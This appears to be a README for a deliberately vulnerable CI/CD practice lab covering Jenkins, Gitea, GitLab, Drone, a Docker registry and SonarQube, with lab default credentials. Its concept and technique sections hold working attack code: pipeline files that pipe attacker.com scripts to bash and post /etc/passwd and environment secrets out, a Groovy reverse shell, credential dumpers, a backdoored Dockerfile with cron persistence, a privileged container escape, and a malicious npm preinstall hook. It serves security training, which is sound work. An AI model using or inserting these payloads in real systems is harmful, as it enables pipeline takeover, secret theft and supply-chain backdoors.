# CI/CD Security Targets

Vulnerable CI/CD pipeline components for practicing DevSecOps and supply chain security testing.

## 🎯 CI/CD Services

### 1. Jenkins
- **Port:** 8110 (Web), 50000 (Agent)
- **Initial Setup:** First-time wizard on startup
- **Vulnerabilities:** Script console RCE, credential exposure, plugin vulns
- **Privileged:** Yes (with Docker socket access)

**Access:**
```bash
# Get initial admin password
docker exec lab_jenkins cat /var/jenkins_home/secrets/initialAdminPassword

# Web interface
http://localhost:8110
```

**Attack Vectors:**
- Unauthenticated script console
- Credential dumping
- Build job manipulation
- Plugin vulnerabilities
- Docker socket abuse

### 2. Gitea - Git Service
- **Port:** 8111 (Web), 2222 (SSH)
- **Setup:** Configure on first access
- **Default Admin:** Create during setup
- **Vulnerabilities:** Git hooks, repository tampering, secret leakage

**Access:**
```bash
# Web interface
http://localhost:8111

# Git clone
git clone http://localhost:8111/user/repo.git

# SSH access
git clone ssh://git@localhost:2222/user/repo.git
```

**Attack Vectors:**
- Malicious Git hooks
- Commit signature bypass
- Secret scanning
- Repository backdoors

### 3. GitLab Community Edition
- **Port:** 8112 (External), 8113 (Internal), 2223 (SSH)
- **Default Credentials:** root:Passw0rd!
- **Vulnerabilities:** Pipeline injection, secrets in CI/CD, SSRF

**Access:**
```bash
# Web interface
http://gitlab.local:8112
# or
http://localhost:8113

# Add to /etc/hosts
echo "127.0.0.1 gitlab.local" | sudo tee -a /etc/hosts
```

**Attack Vectors:**
- CI/CD variable extraction
- Pipeline job manipulation
- Runner exploitation
- GitLab Rails console access

### 4. Drone CI
- **Port:** 8114
- **RPC Secret:** secret123
- **Integration:** Connected to Gitea
- **Vulnerabilities:** Pipeline manipulation, secret exposure

**Access:**
```bash
# Web interface
http://localhost:8114

# Drone CLI
drone info
drone repo ls
```

**Attack Vectors:**
- Malicious .drone.yml
- Secret exfiltration
- Container escape via builds
- Privilege escalation

### 5. Docker Registry
- **Port:** 5000
- **Authentication:** None (insecure by design)
- **Vulnerabilities:** Image tampering, malicious layers, secret exposure

**Access:**
```bash
# List repositories
curl http://localhost:5000/v2/_catalog

# List tags
curl http://localhost:5000/v2/<repo>/tags/list

# Pull image
docker pull localhost:5000/<image>:<tag>

# Push image
docker tag myimage localhost:5000/myimage:latest
docker push localhost:5000/myimage:latest
```

**Attack Vectors:**
- Image poisoning
- Layer analysis for secrets
- Registry enumeration
- Malicious image injection

### 6. SonarQube
- **Port:** 8115
- **Default Credentials:** admin:admin
- **Vulnerabilities:** Code exposure, credential leaks in analysis

**Access:**
```bash
# Web interface
http://localhost:8115

# Login: admin/admin
```

**Attack Vectors:**
- Source code access
- Credential exposure in logs
- Project enumeration
- Quality gate bypass

## 🎓 CI/CD Security Concepts

### Pipeline Injection
```yaml
# Malicious .gitlab-ci.yml
stages:
  - exploit

backdoor:
  stage: exploit
  script:
    - curl http://attacker.com/shell.sh | bash
    - cat /etc/passwd > /tmp/passwd.txt
    - curl -X POST -d @/tmp/passwd.txt http://attacker.com/exfil
```

### Secret Extraction
```bash
# Jenkins script console
def secrets = Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0].getStore().getCredentials()
secrets.each { println it.username + ":" + it.password }

# GitLab CI/CD variables
curl --header "PRIVATE-TOKEN: <token>" \
  "http://gitlab.local:8112/api/v4/projects/1/variables"
```

### Supply Chain Attack
```dockerfile
# Malicious Dockerfile
FROM ubuntu:20.04
RUN curl http://attacker.com/backdoor.sh | bash
RUN echo "* * * * * /backdoor.sh" > /etc/cron.d/backdoor
COPY malicious_app /app
```

### Container Escape via CI/CD
```yaml
# Drone pipeline with privileged container
kind: pipeline
name: exploit

steps:
- name: escape
  image: ubuntu
  privileged: true
  volumes:
    - name: host
      path: /host
  commands:
    - chroot /host /bin/bash -c "id"
    - chroot /host /bin/bash -c "cat /etc/shadow"

volumes:
- name: host
  host:
    path: /
```

## 🛠️ Attack Techniques

### 1. Jenkins Exploitation

**Groovy Script Console RCE:**
```groovy
// Read files
println "cat /etc/passwd".execute().text

// Reverse shell
String host="attacker.com";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

// Dump credentials
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernamesPasswordCredentials.class,
    Jenkins.instance,
    null,
    null
);
for (c in creds) {
  println(c.id + ":" + c.username + ":" + c.password)
}
```

### 2. GitLab Secret Extraction

```bash
# Get project variables
curl --header "PRIVATE-TOKEN: <your_token>" \
  "http://gitlab.local:8112/api/v4/projects/<project_id>/variables"

# Exfiltrate via pipeline
# .gitlab-ci.yml
exfiltrate:
  script:
    - env | grep -i secret
    - curl -X POST -d "$(env)" http://attacker.com/collect
```

### 3. Docker Registry Manipulation

```bash
# Pull image
docker pull localhost:5000/app:latest

# Analyze for secrets
docker history localhost:5000/app:latest
docker inspect localhost:5000/app:latest

# Extract filesystem
docker save localhost:5000/app:latest > app.tar
tar -xf app.tar
# Search for secrets in layers

# Push malicious image
docker tag malicious:latest localhost:5000/app:latest
docker push localhost:5000/app:latest
```

### 4. Supply Chain Poisoning

```bash
# Backdoor source code
git clone http://localhost:8111/user/repo.git
cd repo
echo "curl http://attacker.com/implant | bash" >> build.sh
git commit -am "Update build"
git push

# Malicious dependency
# package.json
{
  "scripts": {
    "preinstall": "curl http://attacker.com/steal.sh | bash"
  }
}
```

## 📋 Security Testing Checklist

- [ ] **Authentication & Authorization**
  - [ ] Default credentials
  - [ ] Weak passwords
  - [ ] API token exposure
  - [ ] RBAC bypass

- [ ] **Secret Management**
  - [ ] Hardcoded secrets in repos
  - [ ] CI/CD variables exposure
  - [ ] Credentials in build logs
  - [ ] API keys in containers

- [ ] **Pipeline Security**
  - [ ] Malicious pipeline injection
  - [ ] Untrusted code execution
  - [ ] Privilege escalation in builds
  - [ ] Resource abuse

- [ ] **Supply Chain**
  - [ ] Dependency confusion
  - [ ] Malicious dependencies
  - [ ] Image tampering
  - [ ] Build cache poisoning

- [ ] **Infrastructure**
  - [ ] Docker socket exposure
  - [ ] Privileged containers
  - [ ] Network segmentation
  - [ ] Secret storage

## 🚀 Practice Scenarios

### Beginner
1. Access Jenkins without authentication
2. Enumerate Gitea repositories
3. Find secrets in GitLab CI/CD variables
4. List Docker registry images

### Intermediate
1. Execute code via Jenkins script console
2. Inject malicious pipeline in GitLab
3. Extract secrets from Docker images
4. Manipulate build artifacts

### Advanced
1. Full CI/CD pipeline compromise
2. Supply chain attack simulation
3. Container escape via build job
4. Persistent backdoor in CI/CD

## 🔍 Automated Scanning

```bash
# Jenkins CVE scanner
nuclei -u http://localhost:8110 -t ~/nuclei-templates/cves/

# GitLab version detection
curl http://localhost:8113/api/v4/version

# Docker registry enum
reg ls localhost:5000

# Secret scanning in git repos
trufflehog git http://localhost:8111/user/repo.git

# Container image scanning
trivy image localhost:5000/app:latest
```

## ⚠️ Real-World Implications

**Common CI/CD Compromises:**
- SolarWinds: Build system compromise
- CodeCov: Bash Uploader script modification
- ua-parser-js: npm package compromise
- event-stream: Dependency injection

**Impact:**
- Code signing key theft
- Customer data breach
- Supply chain backdoors
- Infrastructure compromise

## 📚 Resources

- [OWASP CI/CD Security Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
- [Attacking CI/CD Pipelines](https://github.com/rung/threat-matrix-cicd)
- [Jenkins Security Advisory](https://www.jenkins.io/security/advisories/)
- [GitLab Security](https://about.gitlab.com/security/)
- [Supply Chain Security](https://slsa.dev/)
